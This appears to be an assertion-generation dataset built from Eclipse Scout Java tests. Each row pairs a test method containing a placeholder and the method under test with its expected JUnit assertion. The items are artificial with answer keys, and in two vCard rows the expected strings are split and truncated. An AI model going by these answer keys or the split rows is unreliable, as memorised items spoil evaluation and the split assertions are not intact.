"testCreateDate() { ICalVCardHelper helper = BEANS.get(ICalVCardHelper.class); Calendar cal = Calendar.getInstance(); cal.setTimeZone(TimeZone.getTimeZone(""GMT"")); cal.set(2019, Calendar.AUGUST, 23, 15, 22, 0); ""<AssertPlaceHolder>""; }
createDate(Date d) { // Shift the timezone to UTC SimpleDateFormat dateFormatter = new SimpleDateFormat(YEAR_MONTH_DAY_FORMAT); dateFormatter.setTimeZone(TimeZone.getTimeZone(""UTC"")); // ICal DATE pattern: <yyyyMMdd> return dateFormatter.format(d); }"	"assertEquals(""20190823"", helper.createDate(cal.getTime()))"
"testWrite() { VCardBean vcard = BEANS.get(VCardBean.class); ICalVCardHelper helper = BEANS.get(ICalVCardHelper.class); vcard.addProperty(VCardProperties.PROP_BEGIN_VCARD); vcard.addProperty(VCardProperties.PROP_VERSION_3_0); vcard.addProperty(new Property(VCardProperties.PROP_NAME_PRODID, ""PRODID"")); vcard.addProperty(new Property(VCardProperties.PROP_NAME_FN, ""John Doe"")); vcard.addProperty(new Property(VCardProperties.PROP_NAME_N, helper.composeStructuredValueFromSingleValues(""Doe"", ""John"", ""Hannes"", ""Dr."", null))); vcard.addProperty(new Property(VCardProperties.PROP_NAME_TEL, Arrays.asList(new PropertyParameter(VCardProperties.PARAM_NAME_TYPE, VCardProperties.PARAM_VALUE_VOICE, VCardProperties.PARAM_VALUE_WORK)), ""0998887766"")); vcard.addProperty(new Property(VCardProperties.PROP_NAME_TITLE, ""Software Engineer"")); vcard.addProperty(new Property(VCardProperties.PROP_NAME_EMAIL, Arrays.asList(new PropertyParameter(VCardProperties.PARAM_NAME_TYPE, VCardProperties.PARAM_VALUE_WORK)), ""john.doe@email.com"")); vcard.addProperty(new Property(VCardProperties.PROP_NAME_ORG, helper.composeStructuredValueFromSingleValues(""Doe Corporation""))); vcard.addProperty(new Property(VCardProperties.PROP_NAME_ADR, Arrays.asList(new PropertyParameter(VCardProperties.PARAM_NAME_TYPE, VCardProperties.PARAM_VALUE_HOME)), helper.composeStructuredValueFromSingleValues(null, null, ""Bahnhofweg"", ""Zurich"", null, ""8000"", ""Switzerland"")));  vcard.addProperty(VCardProperties.PROP_END_VCARD);  StringWriter w = new StringWriter(); vcard.write(w, ""utf-8""); String writtenVCard = w.toString();  ""<AssertPlaceHolder>"";CHARSET=utf-8:PRODID\r\n"" + ""FN;CHARSET=utf-8:John Doe\r\n"" + ""N;CHARSET=utf-8:Doe;John;Hannes;Dr.;\r\n"" + ""TEL;CHARSET=utf-8;TYPE=VOICE,WORK:0998887766\r\n"" + ""TITLE;CHARSET=utf-8:Software Engineer\r\n"" + ""EMAIL;CHARSET=utf-8;TYPE=WORK:john.doe@email.com\r\n"" + ""ORG;CHARSET=utf-8:Doe Corporation\r\n"" + ""ADR;CHARSET=utf-8;TYPE=HOME:;;Bahnhofweg;Zurich;;8000;Switzerland\r\n"" + ""END:VCARD\r\n"" + """", writtenVCard); }
write(Writer w, String charset) { BEANS.get(ICalVCardHelper.class).write(this, w, charset); }"	"assertEquals(""BEGIN:VCARD\r\n"" + ""VERSION:3.0\r\n"" + ""PRODID"
"testVCard() { VCardBean vcard = BEANS.get(VCardBuilder.class) .withDisplayName(""displayname"") .withName(""Tommy"", ""middlename"", ""Mustermann"", ""Dr."") .withEmail(VCardProperties.PARAM_VALUE_HOME, ""tommy@mustermann.de"") .withJobTitle(""Software Engineer"") .withOrganizations(""Mustermann GmbH"", ""mustermann.de"") .withProductIdentifier(""productidentifiert"") .withTel(VCardProperties.PARAM_VALUE_WORK, VCardProperties.PARAM_VALUE_CELL, ""0776665544"") .withAddress(VCardProperties.PARAM_VALUE_HOME, ""Bahnhofstrasse"", ""1234"", ""Entenhausen"", ""Schweiz"") .build();  ""<AssertPlaceHolder>"";CHARSET=utf-8:displayname\r\n"" + ""N;CHARSET=utf-8:Mustermann;Tommy;middlename;Dr.;\r\n"" + ""EMAIL;CHARSET=utf-8;TYPE=HOME:tommy@mustermann.de\r\n"" + ""TITLE;CHARSET=utf-8:Software Engineer\r\n"" + ""ORG;CHARSET=utf-8:Mustermann GmbH;mustermann.de\r\n"" + ""PRODID;CHARSET=utf-8:productidentifiert\r\n"" + ""TEL;CHARSET=utf-8;TYPE=WORK,CELL:0776665544\r\n"" + ""ADR;CHARSET=utf-8;TYPE=HOME:;;Bahnhofstrasse;Entenhausen;;1234;Schweiz\r\n"" + ""END:VCARD\r\n"", new String(vcard.toBytes(""utf-8""))); }
build() { end(); return m_vcard; }"	"assertEquals(""BEGIN:VCARD\r\n"" + ""VERSION:3.0\r\n"" + ""FN"
"testComposerField() { MyComposerField composer = new MyComposerField(); composer.init(); runBasicAsserts(composer);  CarEntity carEntity = composer.new CarEntity(); ITreeNode carNode = composer.addEntityNode( composer.getTree().getRootNode(), carEntity, true, Collections.emptyList(), new ArrayList<>());  composer.addAttributeNode(carNode, carEntity.new ColorAttribute(), DataModelConstants.AGGREGATION_NONE, DataModelAttributeOp.create(DataModelConstants.OPERATOR_EQ), CollectionUtility.arrayList(""blue key""), CollectionUtility.arrayList(""blue value"")); m_searchFilterService.applySearchDelegate(composer, m_searchFilter, false); StringBuilder result = new StringBuilder(); new ComposerDisplayTextBuilder().build(composer.getTree().getRootNode(), result, """"); Assert.""<AssertPlaceHolder>""; }
applySearchDelegate(IFormField field, SearchFilter search, boolean includeChildren) { super.applySearchDelegate(field, search, includeChildren);  //composer if (field instanceof AbstractComposerField) { AbstractComposerField composerField = (AbstractComposerField) field; ITreeNode rootNode = composerField.getTree().getRootNode(); if (rootNode != null) { StringBuilder buf = new StringBuilder(); new ComposerDisplayTextBuilder().build(rootNode, buf, """"); String s = buf.toString(); if (StringUtility.hasText(s)) { search.addDisplayText(s); } } } }"	assertEquals(result.toString().trim(), m_searchFilter.getDisplayTextsPlain())
"testMerge() { EntityContribution e = new EntityContribution(); e.getFromParts().add(""ADDRESS A""); e.getFromParts().add(""INNER JOIN CONTACT C ON C.PERSON_ID=P.PERSON_ID""); String s = EntityContributionUtility.mergeContributions(EntityStrategy.BuildQuery, ""select 1 from <fromParts>user u</fromParts> where 1=1"", e, true).getSelectParts().get(0); Assert.""<AssertPlaceHolder>""; }
mergeContributions(EntityStrategy entityStrategy, final String entityPartWithTags, EntityContribution childContributions, boolean consumeChildContributions) { String entityPart = entityPartWithTags; EntityContribution parentContrib = new EntityContribution(); //PROCESS collectiong tags: selectParts, fromParts, whereParts, groupBy, groupByParts, havingParts if (!consumeChildContributions) { //just proxy through to parent parentContrib.add(childContributions); } else { // extend the select section if (!childContributions.getSelectParts().isEmpty()) { StringBuilder selectBuf = new StringBuilder(); for (String selectPart : childContributions.getSelectParts()) { if (selectBuf.length() > 0) { selectBuf.append("", ""); } selectBuf.append(autoBracketSelectPart(selectPart)); } final String s = selectBuf.toString(); if (StringUtility.getTag(entityPart, ""selectParts"") != null) { entityPart = StringUtility.replaceTags(entityPart, ""selectParts"", (tagName, tagContent) -> { if (!tagContent.isEmpty()) { return tagContent + "", "" + s; } return s; }); } else { throw new IllegalArgumentException(""missing <selectParts/> tag""); } } entityPart = StringUtility.removeTagBounds(entityPart, ""selectParts""); // extend the from section Set<String> fromParts = new TreeSet<>(childContributions.getFromParts()); if (!fromParts.isEmpty()) { StringBuilder buf = new StringBuilder(); for (String fromPart : fromParts) { if (!isAnsiJoin(fromPart)) { buf.append("",""); } buf.append("" ""); buf.append(fromPart); } final String s = buf.toString(); if (StringUtility.getTag(entityPart, ""fromParts"") != null) { entityPart = StringUtility.replaceTags(entityPart, ""fromParts"", (tagName, tagContent) -> tagContent + s); } else { throw new IllegalArgumentException(""missing <fromParts/> tag""); } } entityPart = StringUtility.removeTagBounds(entityPart, ""fromParts""); // extend the where section if (!childContributions.getWhereParts().isEmpty()) {  final String s = CollectionUtility.format(childContributions.getWhereParts(), "" AND ""); if (StringUtility.getTag(entityPart, ""whereParts"") != null) { entityPart = StringUtility.replaceTags(entityPart, ""whereParts"", (tagName, tagContent) -> { return tagContent + "" AND "" + s;//legacy: always prefix an additional AND }); } else { entityPart = entityPart + "" AND "" + s; } } entityPart = StringUtility.removeTagBounds(entityPart, ""whereParts""); // extend the group by / having section if (StringUtility.getTag(entityPart, ""groupBy"") != null) { int selectGroupByDelta = childContributions.getSelectParts().size() - childContributions.getGroupByParts().size(); if ((selectGroupByDelta > 0 && !childContributions.getGroupByParts().isEmpty()) || !childContributions.getHavingParts().isEmpty()) { entityPart = StringUtility.removeTagBounds(entityPart, ""groupBy""); if (!childContributions.getGroupByParts().isEmpty()) { //check group by parts for (String s : childContributions.getGroupByParts()) { checkGroupByPart(s); } final String s = CollectionUtility.format(childContributions.getGroupByParts(), "", ""); if (StringUtility.getTag(entityPart, ""groupByParts"") != null) { entityPart = StringUtility.replaceTags(entityPart, ""groupByParts"", (tagName, tagContent) -> { if (!tagContent.isEmpty()) { return tagContent + "", "" + s; } return s; }); } else { throw new IllegalArgumentException(""missing <groupByParts/> tag""); } } else { //no group by parts, avoid empty GROUP BY clause entityPart = StringUtility.replaceTags(entityPart, ""groupByParts"", (tagName, tagContent) -> { if (!tagContent.isEmpty()) { return tagContent; } return tagContent + "" 1 ""; }); } entityPart = StringUtility.removeTagBounds(entityPart, ""groupByParts""); // if (!childContributions.getHavingParts().isEmpty()) { final String s = CollectionUtility.format(childContributions.getHavingParts(), "" AND ""); if (StringUtility.getTag(entityPart, ""havingParts"") != null) { entityPart = StringUtility.replaceTags(entityPart, ""havingParts"", (tagName, tagContent) -> { return tagContent + "" AND "" + s;//legacy: always prefix an additional AND }); } else { throw new IllegalArgumentException(""missing <havingParts/> tag""); } } else { entityPart = StringUtility.removeTagBounds(entityPart, ""havingParts""); } } else { entityPart = StringUtility.replaceTags(entityPart, ""groupBy"", (tagName, tagContent) -> { if (!StringUtility.hasText(StringUtility.getTag(tagContent, ""groupByParts"")) && !StringUtility.hasText(StringUtility.getTag(tagContent, ""havingParts""))) { return """"; }  // preserve statically defined group-by and having parts tagContent = StringUtility.replaceTags(tagContent, ""groupByParts"", (innerTagName, innerTagContent) -> { if (!innerTagContent.isEmpty()) { return innerTagContent; } return innerTagContent + "" 1 ""; }); tagContent = StringUtility.replaceTags(tagContent, ""havingParts"", (innerTagName, innerTagContent) -> innerTagContent); return tagContent; }); } } } //PROCESS contributing tags: selectPart, fromPart, wherePart, groupByPart, havingPart String selectPart = StringUtility.getTag(entityPart, ""selectPart""); if (selectPart != null) { parentContrib.getSelectParts().add(selectPart); entityPart = StringUtility.removeTag(entityPart, ""selectPart"").trim(); } // String fromPart = StringUtility.getTag(entityPart, ""fromPart""); if (fromPart != null) { parentContrib.getFromParts().add(fromPart); entityPart = StringUtility.removeTag(entityPart, ""fromPart"").trim(); } // String wherePart = StringUtility.getTag(entityPart, ""wherePart""); if (wherePart != null) { parentContrib.getWhereParts().add(wherePart); entityPart = StringUtility.removeTag(entityPart, ""wherePart"").trim(); } // String groupByPart = StringUtility.getTag(entityPart, ""groupByPart""); if (groupByPart != null) { parentContrib.getGroupByParts().add(groupByPart); entityPart = StringUtility.removeTag(entityPart, ""groupByPart"").trim(); } // String havingPart = StringUtility.getTag(entityPart, ""havingPart""); if (havingPart != null) { parentContrib.getHavingParts().add(havingPart); entityPart = StringUtility.removeTag(entityPart, ""havingPart"").trim(); } if (parentContrib.isEmpty()) { switch (entityStrategy) { case BuildConstraints: { parentContrib.getWhereParts().add(entityPart); break; } case BuildQuery: { parentContrib.getSelectParts().add(entityPart); parentContrib.getGroupByParts().add(""1""); break; } } } else { //check for remaining dirt if (!entityPart.isEmpty()) { LOG.warn(""entityPart {} contains content that is not wrapped in a tag: {}"", entityPartWithTags, entityPart); } } return parentContrib; }"	"assertEquals(""select 1 from user u, ADDRESS A INNER JOIN CONTACT C ON C.PERSON_ID=P.PERSON_ID where 1=1"", s)"
"createSelectStatementStatementNull() { m_builder.build(m_formData); Assert.""<AssertPlaceHolder>""; }
build(AbstractFormData formData) { m_where = new StringBuilder(); // get all formData fields and properties defined directly and indirectly by extending template fields, respectively //build constraints for fields for (BasicPartDefinition def : m_basicDefs) { if (def.accept(formData)) { Map<String, String> parentAliasMap = getAliasMapper().getRootAliases(); EntityContribution contrib = def.createInstance(this, formData, parentAliasMap); String cons = createWhereConstraint(contrib); if (cons != null) { addWhere("" AND "" + cons); } } } //build constraints for composer trees Map<Integer, Map<String, AbstractFormFieldData>> fieldsBreathFirstMap = formData.getAllFieldsRec(); for (Map<String, AbstractFormFieldData> map : fieldsBreathFirstMap.values()) { for (AbstractFormFieldData f : map.values()) { if (f.isValueSet() && f instanceof AbstractTreeFieldData) { // composer tree with entity, attribute EntityContribution contrib = buildTreeNodes(((AbstractTreeFieldData) f).getRoots(), EntityStrategy.BuildConstraints, AttributeStrategy.BuildConstraintOfAttributeWithContext); String cons = createWhereConstraint(contrib); if (cons != null) { addWhere("" AND "" + cons); } } } } return getWhereConstraints(); }"	assertNull(m_builder.createSelectStatement(null))
"createSelectStatementContributionNullContributions() { m_builder.build(m_formData); String actual = m_builder.createSelectStatement(STATEMENT_TEMPLATE, null, null); Assert.""<AssertPlaceHolder>""; }
build(AbstractFormData formData) { m_where = new StringBuilder(); // get all formData fields and properties defined directly and indirectly by extending template fields, respectively //build constraints for fields for (BasicPartDefinition def : m_basicDefs) { if (def.accept(formData)) { Map<String, String> parentAliasMap = getAliasMapper().getRootAliases(); EntityContribution contrib = def.createInstance(this, formData, parentAliasMap); String cons = createWhereConstraint(contrib); if (cons != null) { addWhere("" AND "" + cons); } } } //build constraints for composer trees Map<Integer, Map<String, AbstractFormFieldData>> fieldsBreathFirstMap = formData.getAllFieldsRec(); for (Map<String, AbstractFormFieldData> map : fieldsBreathFirstMap.values()) { for (AbstractFormFieldData f : map.values()) { if (f.isValueSet() && f instanceof AbstractTreeFieldData) { // composer tree with entity, attribute EntityContribution contrib = buildTreeNodes(((AbstractTreeFieldData) f).getRoots(), EntityStrategy.BuildConstraints, AttributeStrategy.BuildConstraintOfAttributeWithContext); String cons = createWhereConstraint(contrib); if (cons != null) { addWhere("" AND "" + cons); } } } } return getWhereConstraints(); }"	"assertEquals(""SELECT P.PERSON_NR FROM ORS_PERSON P WHERE 1=1"", StringUtility.cleanup(actual))"
"createSelectStatementWhereConstraintsOnly() { m_builder.build(m_formData); m_builder.addWhere("" AND 0=0 ""); String actual = m_builder.createSelectStatement(STATEMENT_TEMPLATE); Assert.""<AssertPlaceHolder>""; }
build(AbstractFormData formData) { m_where = new StringBuilder(); // get all formData fields and properties defined directly and indirectly by extending template fields, respectively //build constraints for fields for (BasicPartDefinition def : m_basicDefs) { if (def.accept(formData)) { Map<String, String> parentAliasMap = getAliasMapper().getRootAliases(); EntityContribution contrib = def.createInstance(this, formData, parentAliasMap); String cons = createWhereConstraint(contrib); if (cons != null) { addWhere("" AND "" + cons); } } } //build constraints for composer trees Map<Integer, Map<String, AbstractFormFieldData>> fieldsBreathFirstMap = formData.getAllFieldsRec(); for (Map<String, AbstractFormFieldData> map : fieldsBreathFirstMap.values()) { for (AbstractFormFieldData f : map.values()) { if (f.isValueSet() && f instanceof AbstractTreeFieldData) { // composer tree with entity, attribute EntityContribution contrib = buildTreeNodes(((AbstractTreeFieldData) f).getRoots(), EntityStrategy.BuildConstraints, AttributeStrategy.BuildConstraintOfAttributeWithContext); String cons = createWhereConstraint(contrib); if (cons != null) { addWhere("" AND "" + cons); } } } } return getWhereConstraints(); }"	"assertEquals(""SELECT P.PERSON_NR FROM ORS_PERSON P WHERE 1=1 AND 0=0"", StringUtility.cleanup(actual))"
"createSelectStatementWithContribution() { m_builder.build(m_formData); EntityContribution contrib = new EntityContribution(); contrib.addSelectExpression(""MA.NAME"", false); contrib.addFromExpression(""ORS_PERSON MA""); contrib.addWhereConstraint(""MA.PERSON_NR != P.MAIN_ACCOUNT_NR""); m_builder.addWhere("" AND 0=0 ""); String actual = m_builder.createSelectStatement(STATEMENT_TEMPLATE, contrib); Assert.""<AssertPlaceHolder>""; }
createSelectStatement(String stm, EntityContribution... contributions) { EntityContribution mergedContribution = new EntityContribution(); if (contributions != null) { for (EntityContribution c : contributions) { mergedContribution.add(c); } } String where = StringUtility.trim(getWhereConstraints()); if (StringUtility.hasText(where)) { if (where.toUpperCase().startsWith(""AND"")) { where = where.substring(3); } mergedContribution.getWhereParts().add(where); } return createEntityPart(stm, false, mergedContribution); }"	"assertEquals(""SELECT P.PERSON_NR, MA.NAME FROM ORS_PERSON P, ORS_PERSON MA WHERE 1=1 AND MA.PERSON_NR != P.MAIN_ACCOUNT_NR AND 0=0"", StringUtility.cleanup(actual))"
"testHashCode() { ""<AssertPlaceHolder>""; }
hashCode() { return m_id.hashCode(); }"	assertEquals(FIXTURE_UUID_1.hashCode(), FIXTURE_UUID_1.hashCode())
"testUnwrap() { ""<AssertPlaceHolder>""; }
unwrap() { return m_id; }"	assertEquals(TEST_UUID, FIXTURE_UUID_1.unwrap())
"testUnwrapAsString() { ""<AssertPlaceHolder>""; }
unwrapAsString() { return unwrap().toString(); }"	assertEquals(TEST_UUID.toString(), FIXTURE_UUID_1.unwrapAsString())
"testToString() { ""<AssertPlaceHolder>""; }
toString() { return getClass().getSimpleName() + "" ["" + m_id + ""]""; }"	"assertEquals(""FixtureStringId [mock]"", FixtureStringId.of(""mock"").toString())"
"testEnsureDeclaredNodesNullSafe() { ""<AssertPlaceHolder>""; }
ensureDeclaredNodes(E entity) { if (entity == null) { return null; } m_dataObjectInventory.get().getAttributesDescription(entity.getClass()) .values() .forEach(desc -> ensureNodeValue(entity, desc.getName(), desc.getType().getRawType(), null, false)); return entity; }"	assertNull(m_helper.ensureDeclaredNodes(null))
"testGetTypeNameToClassMapSize() { ""<AssertPlaceHolder>""; }
getTypeNameToClassMap() { return Collections.unmodifiableMap(m_typeNameToClassMap); }"	assertEquals(5, m_inventory.getTypeNameToClassMap().size())
"testForEachRec_List() { DoList<OtherEntityFixtureDo> list = new DoList<>(); list.addAll(fixtureEntity.getOtherEntitiesList());  List<OtherEntityFixtureDo> visited = new ArrayList<>(); DataObjectVisitors.forEachRec(list, OtherEntityFixtureDo.class, visited::add); ""<AssertPlaceHolder>"";  List<OtherEntityFixtureDo> expected = new ArrayList<>(); expected.addAll(fixtureEntity.getOtherEntitiesList()); CollectionUtility.containsAll(visited, expected); }
forEachRec(Object root, Class<? extends T> elementType, Consumer<T> consumer) { forEach(root, new P_TypedElementConsumer<>(elementType, consumer, true)); }"	assertEquals(2, visited.size())
"testReplaceEach_identity() { OtherEntityFixtureDo otherEntity = BEANS.get(OtherEntityFixtureDo.class) .withId(""otherId"");  EntityFixtureDo entity = BEANS.get(EntityFixtureDo.class) .withId(""myId"") .withOtherEntity(otherEntity);  DataObjectVisitors.replaceEach(entity, OtherEntityFixtureDo.class, o -> o); ""<AssertPlaceHolder>""; }
replaceEach(Object root, Class<? extends T> elementType, UnaryOperator<T> operator) { new P_ReplaceDataObjectVisitor<>(elementType, operator).visit(root); }"	assertEquals(otherEntity, entity.getOtherEntity())
"testReplaceEach_replaceAll_DoEntityContribution() { EntityContributionFixtureDo entityOtherContribution = BEANS.get(EntityContributionFixtureDo.class).withId(""other-entity-contribution""); DataObjectVisitors.replaceEach(fixtureEntity, EntityContributionFixtureDo.class, o -> entityOtherContribution); ""<AssertPlaceHolder>""; }
replaceEach(Object root, Class<? extends T> elementType, UnaryOperator<T> operator) { new P_ReplaceDataObjectVisitor<>(elementType, operator).visit(root); }"	assertEquals(entityOtherContribution, fixtureEntity.getContribution(EntityContributionFixtureDo.class))
"testBuildNullValues() { DoEntity expected = BEANS.get(DoEntity.class); expected.put(""attribute1"", null); expected.putList(""listAttribute1"", CollectionUtility.emptyArrayList()); expected.putList(""listAttribute2"", CollectionUtility.emptyArrayList());  IDoEntity actual = BEANS.get(DoEntityBuilder.class) .put(""attribute1"", null) .putList(""listAttribute1"", (Object[]) null) .putList(""listAttribute2"", (List<Object>) null) .build(); ""<AssertPlaceHolder>""; }
build() { return m_entity; }"	assertEqualsWithComparisonFailure(expected, actual)
"testGetString() { DoEntity entity = BEANS.get(DoEntity.class); entity.put(""foo"", ""bar""); ""<AssertPlaceHolder>""; }
put(String attributeName, Object value) { if (has(attributeName)) { getValueNode(attributeName).set(value); } else { newValueNode(attributeName, value).create(); } }"	"assertEquals(""bar"", entity.getString(""foo""))"
"testGetString_NullValue() { DoEntity entity = BEANS.get(DoEntity.class); entity.put(""bar"", null); ""<AssertPlaceHolder>""; }
put(String attributeName, Object value) { if (has(attributeName)) { getValueNode(attributeName).set(value); } else { newValueNode(attributeName, value).create(); } }"	"assertNull(entity.getString(""bar""))"
"testGetList_nullValue() { DoEntity entity = BEANS.get(DoEntity.class); entity.putList(""bar"", null); ""<AssertPlaceHolder>""; }
putList(String attributeName, List<V> value) { if (has(attributeName)) { DoList<V> node = getListNode(attributeName); node.set(value); } else { newListNode(attributeName, value).create(); } }"	"assertTrue(entity.getList(""bar"").isEmpty())"
"testGetList_nullItemValue() { DoEntity entity = BEANS.get(DoEntity.class); List<Object> list = newListWithOneNullValue(); entity.putList(""bar"", list); ""<AssertPlaceHolder>""; }
putList(String attributeName, List<V> value) { if (has(attributeName)) { DoList<V> node = getListNode(attributeName); node.set(value); } else { newListNode(attributeName, value).create(); } }"	"assertNull(entity.getList(""bar"").get(0))"
"testGetStringList_nullValue() { DoEntity entity = BEANS.get(DoEntity.class); entity.putList(""bar"", null); ""<AssertPlaceHolder>""; }
putList(String attributeName, List<V> value) { if (has(attributeName)) { DoList<V> node = getListNode(attributeName); node.set(value); } else { newListNode(attributeName, value).create(); } }"	"assertTrue(entity.getStringList(""bar"").isEmpty())"
"testGetStringList_nullItemValue() { DoEntity entity = BEANS.get(DoEntity.class); List<Object> list = newListWithOneNullValue(); entity.putList(""bar"", list); ""<AssertPlaceHolder>""; }
putList(String attributeName, List<V> value) { if (has(attributeName)) { DoList<V> node = getListNode(attributeName); node.set(value); } else { newListNode(attributeName, value).create(); } }"	"assertNull(entity.getStringList(""bar"").get(0))"
"testGetBoolean() { DoEntity entity = BEANS.get(DoEntity.class); entity.put(""foo"", true); ""<AssertPlaceHolder>""; }
put(String attributeName, Object value) { if (has(attributeName)) { getValueNode(attributeName).set(value); } else { newValueNode(attributeName, value).create(); } }"	"assertEquals(true, entity.getBoolean(""foo""))"
"testGetBoolean_nullValue() { DoEntity entity = BEANS.get(DoEntity.class); entity.put(""bar"", null); ""<AssertPlaceHolder>""; }
put(String attributeName, Object value) { if (has(attributeName)) { getValueNode(attributeName).set(value); } else { newValueNode(attributeName, value).create(); } }"	"assertNull(entity.getBoolean(""bar""))"
"testGetBooleanList_nullValue() { DoEntity entity = BEANS.get(DoEntity.class); entity.putList(""bar"", null); ""<AssertPlaceHolder>""; }
putList(String attributeName, List<V> value) { if (has(attributeName)) { DoList<V> node = getListNode(attributeName); node.set(value); } else { newListNode(attributeName, value).create(); } }"	"assertTrue(entity.getBooleanList(""bar"").isEmpty())"
"testGetBooleanList_nullItemValue() { DoEntity entity = BEANS.get(DoEntity.class); List<Object> list = newListWithOneNullValue(); entity.putList(""bar"", list); ""<AssertPlaceHolder>""; }
putList(String attributeName, List<V> value) { if (has(attributeName)) { DoList<V> node = getListNode(attributeName); node.set(value); } else { newListNode(attributeName, value).create(); } }"	"assertNull(entity.getBooleanList(""bar"").get(0))"
"testGetDecimal_nullValue() { DoEntity entity = BEANS.get(DoEntity.class); entity.put(""bar"", null); ""<AssertPlaceHolder>""; }
put(String attributeName, Object value) { if (has(attributeName)) { getValueNode(attributeName).set(value); } else { newValueNode(attributeName, value).create(); } }"	"assertNull(entity.getDecimal(""bar""))"
"testGetDecimalList_nullValue() { DoEntity entity = BEANS.get(DoEntity.class); entity.putList(""bar"", null); ""<AssertPlaceHolder>""; }
putList(String attributeName, List<V> value) { if (has(attributeName)) { DoList<V> node = getListNode(attributeName); node.set(value); } else { newListNode(attributeName, value).create(); } }"	"assertTrue(entity.getDecimalList(""bar"").isEmpty())"
"testGetDecimalList_nullItemValue() { DoEntity entity = BEANS.get(DoEntity.class); List<Object> list = newListWithOneNullValue(); entity.putList(""bar"", list); ""<AssertPlaceHolder>""; }
putList(String attributeName, List<V> value) { if (has(attributeName)) { DoList<V> node = getListNode(attributeName); node.set(value); } else { newListNode(attributeName, value).create(); } }"	"assertNull(entity.getDecimalList(""bar"").get(0))"
"testPutIf() { DoEntity expected = BEANS.get(DoEntity.class); expected.put(""foo1"", ""value1""); expected.put(""foo3"", ""value3"");  DoEntity actual = BEANS.get(DoEntity.class); actual.putIf(""foo1"", ""value1"", Objects::nonNull); actual.putIf(""foo2"", null, Objects::nonNull); actual.putIf(""foo3"", ""value3"", Objects::nonNull);  ""<AssertPlaceHolder>""; }
put(String attributeName, Object value) { if (has(attributeName)) { getValueNode(attributeName).set(value); } else { newValueNode(attributeName, value).create(); } }"	assertEqualsWithComparisonFailure(expected, actual)
"testGet() { String one = m_entity.get(""one""); ""<AssertPlaceHolder>""; }
get(String attributeName) { return mapValue(super.get(attributeName)); }"	"assertEquals(""foo"", one)"
"testGetEnumNameToClassMapItems() { ""<AssertPlaceHolder>""; }
getEnumNameToClassMap() { return Collections.unmodifiableMap(m_enumNameToClassMap); }"	"assertEquals(AlphabetFixture.class, m_inventory.getEnumNameToClassMap().get(""scout.AlphabetFixture""))"
"testGetEnumNameToClassMapSize() { ""<AssertPlaceHolder>""; }
getEnumNameToClassMap() { return Collections.unmodifiableMap(m_enumNameToClassMap); }"	assertEquals(1, m_inventory.getEnumNameToClassMap().size())
"testInit() { EnumInventory inv = BEANS.get(EnumInventory.class); ""<AssertPlaceHolder>""; }
toEnumName(Class<?> queryClazz) { return m_classToEnumName.get(queryClazz); }"	"assertEquals(""scout.AlphabetFixture"", inv.toEnumName(AlphabetFixture.class))"
"testCreateStringId() { String str = ""aaabbbccc""; FixtureStringId id = BEANS.get(IdFactory.class).createInternal(FixtureStringId.class, str); ""<AssertPlaceHolder>""; }
createInternal(Class<ID> idClass, Object... values) { try { Method createMethod = lookupCreateMethod(idClass); return idClass.cast(createMethod.invoke(null, values)); } catch (Exception e) { throw BEANS.get(PlatformExceptionTranslator.class).translate(e) .withContextInfo(""idClass"", idClass.getName()) .withContextInfo(""values"", Arrays.toString(values)); } }"	assertEquals(str, id.unwrap())
"testCreateStringId_NullValue() { String str = null; FixtureStringId id = BEANS.get(IdFactory.class).createInternal(FixtureStringId.class, str); ""<AssertPlaceHolder>""; }
createInternal(Class<ID> idClass, Object... values) { try { Method createMethod = lookupCreateMethod(idClass); return idClass.cast(createMethod.invoke(null, values)); } catch (Exception e) { throw BEANS.get(PlatformExceptionTranslator.class).translate(e) .withContextInfo(""idClass"", idClass.getName()) .withContextInfo(""values"", Arrays.toString(values)); } }"	assertNull(id)
"testCreateFixtureStringId_CustomOf() { String str = ""aaabbbccc""; FixtureStringId_RawTypesOf id = BEANS.get(IdFactory.class).createInternal(FixtureStringId_RawTypesOf.class, str); ""<AssertPlaceHolder>""; }
createInternal(Class<ID> idClass, Object... values) { try { Method createMethod = lookupCreateMethod(idClass); return idClass.cast(createMethod.invoke(null, values)); } catch (Exception e) { throw BEANS.get(PlatformExceptionTranslator.class).translate(e) .withContextInfo(""idClass"", idClass.getName()) .withContextInfo(""values"", Arrays.toString(values)); } }"	assertEquals(str, id.unwrap())
